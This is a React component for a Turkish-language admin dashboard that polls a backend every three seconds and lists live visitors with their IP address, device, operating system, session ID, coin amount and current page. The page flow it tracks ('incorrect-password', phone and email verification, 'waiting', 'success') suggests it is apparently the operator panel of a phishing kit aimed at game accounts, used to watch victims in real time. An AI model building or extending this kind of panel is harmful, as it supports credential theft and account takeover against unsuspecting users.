import React, { useState, useEffect } from 'react';
import axios from 'axios';

const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';

const LiveUsersPage = () => {
  const [users, setUsers] = useState([]);
  const [count, setCount] = useState(0);
  const [loading, setLoading] = useState(true);
  const [lastUpdate, setLastUpdate] = useState(new Date());
  const [selectedDate, setSelectedDate] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(true);

  const fetchLiveUsers = async (date = null) => {
    try {
      let url = `${API}/api/admin/live-users`;
      if (date) {
        url += `?date=${date}`;
      }
      
      const response = await axios.get(url);
      if (response.data.success) {
        setUsers(response.data.users);
        setCount(response.data.count);
        setLastUpdate(new Date());
      }
      setLoading(false);
    } catch (error) {
      console.error('Failed to fetch live users:', error);
      setLoading(false);
    }
  };

  useEffect(() => {
    // Initial fetch
    fetchLiveUsers(selectedDate);

    // Auto refresh only if no date filter and autoRefresh is enabled
    if (!selectedDate && autoRefresh) {
      const interval = setInterval(() => fetchLiveUsers(), 3000);
      return () => clearInterval(interval);
    }
  }, [selectedDate, autoRefresh]);

  const getStatusColor = (user) => {
    if (user.status === 'exited') return 'bg-red-500';
    if (user.seconds_ago < 15) return 'bg-green-500';
    if (user.seconds_ago < 60) return 'bg-yellow-500';
    return 'bg-gray-500';
  };

  const formatDuration = (secondsAgo) => {
    if (secondsAgo < 60) return `${secondsAgo}s önce`;
    const minutes = Math.floor(secondsAgo / 60);
    return `${minutes}dk önce`;
  };

  const calculateSessionDuration = (entryTime, exitTime) => {
    if (!entryTime) return 'N/A';
    
    const entry = new Date(entryTime);
    const exit = exitTime ? new Date(exitTime) : new Date();
    const diffMs = exit - entry;
    const diffSec = Math.floor(diffMs / 1000);
    
    if (diffSec < 60) return `${diffSec}s`;
    const minutes = Math.floor(diffSec / 60);
    const seconds = diffSec % 60;
    return `${minutes}dk ${seconds}s`;
  };

  const getPageName = (path) => {
    const pages = {
      '/': 'Ana Sayfa',
      '/contact': 'İletişim Bilgileri',
      '/incorrect-password': 'Yanlış Şifre',
      '/verify-phone': 'Telefon Doğrulama',
      '/verify-email': 'Email Doğrulama',
      '/waiting': 'Bekleme',
      '/success': 'Başarılı'
    };
    return pages[path] || path;
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900 flex items-center justify-center">
        <div className="text-white text-2xl">Yükleniyor...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900 p-4 md:p-8">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 mb-6 border border-white/20">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-white mb-2">
                🎮 Canlı Kullanıcı İzleme
              </h1>
              <p className="text-white/70">Son 30 dakikada aktif kullanıcılar</p>
            </div>
            <div className="text-right">
              <div className="text-5xl font-bold text-white">{count}</div>
              <div className="text-white/70 text-sm">Aktif Kullanıcı</div>
            </div>
          </div>
          <div className="mt-4 text-white/60 text-sm">
            Son Güncelleme: {lastUpdate.toLocaleTimeString('tr-TR')}
            <span className="ml-2 animate-pulse">🔄</span>
          </div>
        </div>

        {/* Users List */}
        <div className="space-y-4">
          {users.length === 0 ? (
            <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-12 text-center border border-white/20">
              <div className="text-6xl mb-4">😴</div>
              <div className="text-white text-xl">Şu an aktif kullanıcı yok</div>
              <div className="text-white/60 mt-2">Son 30 dakikada giriş yapan kullanıcı bulunmadı</div>
            </div>
          ) : (
            users.map((user, index) => (
              <div
                key={user.session_id || index}
                className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 border border-white/20 hover:bg-white/15 transition-all duration-300"
              >
                <div className="flex items-start justify-between">
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-3">
                      <div className={`w-3 h-3 rounded-full ${getStatusColor(user)} ${user.status !== 'exited' && 'animate-pulse'}`}></div>
                      <h3 className="text-xl font-bold text-white">
                        {user.username ? `👤 ${user.username}` : '👤 Anonim Kullanıcı'}
                      </h3>
                      {user.status === 'exited' && (
                        <span className="px-3 py-1 bg-red-500/20 border border-red-500/50 rounded-full text-red-300 text-xs font-semibold">
                          Çıktı
                        </span>
                      )}
                      {user.status === 'active' && (
                        <span className="px-3 py-1 bg-green-500/20 border border-green-500/50 rounded-full text-green-300 text-xs font-semibold">
                          Aktif
                        </span>
                      )}
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 text-sm">
                      <div className="flex items-center gap-2 text-white/80">
                        <span className="text-2xl">📍</span>
                        <div>
                          <div className="text-white/60 text-xs">Sayfa:</div>
                          <div className="font-semibold">{getPageName(user.current_page)}</div>
                        </div>
                      </div>

                      <div className="flex items-center gap-2 text-white/80">
                        <span className="text-2xl">🕐</span>
                        <div>
                          <div className="text-white/60 text-xs">Giriş:</div>
                          <div className="font-semibold">{user.entry_time ? new Date(user.entry_time).toLocaleTimeString('tr-TR') : 'N/A'}</div>
                        </div>
                      </div>

                      <div className="flex items-center gap-2 text-white/80">
                        <span className="text-2xl">{user.status === 'exited' ? '🚪' : '⏱️'}</span>
                        <div>
                          <div className="text-white/60 text-xs">{user.status === 'exited' ? 'Çıkış:' : 'Son Görülme:'}</div>
                          <div className="font-semibold">
                            {user.status === 'exited' && user.exit_time 
                              ? new Date(user.exit_time).toLocaleTimeString('tr-TR')
                              : formatDuration(user.seconds_ago)
                            }
                          </div>
                        </div>
                      </div>

                      <div className="flex items-center gap-2 text-white/80">
                        <span className="text-2xl">⏲️</span>
                        <div>
                          <div className="text-white/60 text-xs">Toplam Süre:</div>
                          <div className="font-semibold">{calculateSessionDuration(user.entry_time, user.exit_time)}</div>
                        </div>
                      </div>

                      {user.device_info && (
                        <div className="flex items-center gap-2 text-white/80">
                          <span className="text-2xl">{user.device_info.is_mobile ? '📱' : user.device_info.is_tablet ? '📱' : '💻'}</span>
                          <div>
                            <div className="text-white/60 text-xs">Cihaz:</div>
                            <div className="font-semibold">
                              {user.device_info.device_brand !== 'Unknown' && user.device_info.device_model !== 'Unknown'
                                ? `${user.device_info.device_brand} ${user.device_info.device_model}`
                                : user.device_info.device !== 'Other' 
                                  ? user.device_info.device
                                  : user.device_info.is_mobile ? 'Mobil' : user.device_info.is_tablet ? 'Tablet' : 'PC'
                              }
                            </div>
                          </div>
                        </div>
                      )}

                      {user.device_info && (
                        <div className="flex items-center gap-2 text-white/80">
                          <span className="text-2xl">💿</span>
                          <div>
                            <div className="text-white/60 text-xs">İşletim Sistemi:</div>
                            <div className="font-semibold text-xs">{user.device_info.os}</div>
                          </div>
                        </div>
                      )}

                      {user.amount && (
                        <div className="flex items-center gap-2 text-white/80">
                          <span className="text-2xl">💰</span>
                          <div>
                            <div className="text-white/60 text-xs">Coin:</div>
                            <div className="font-semibold">{user.amount.toLocaleString()}</div>
                          </div>
                        </div>
                      )}

                      <div className="flex items-center gap-2 text-white/80">
                        <span className="text-2xl">🌐</span>
                        <div>
                          <div className="text-white/60 text-xs">IP:</div>
                          <div className="font-semibold font-mono text-xs">{user.ip}</div>
                        </div>
                      </div>
                    </div>

                    <div className="mt-3 pt-3 border-t border-white/10">
                      <div className="text-white/50 text-xs font-mono">
                        Session: {user.session_id?.substring(0, 16)}...
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};

export default LiveUsersPage;
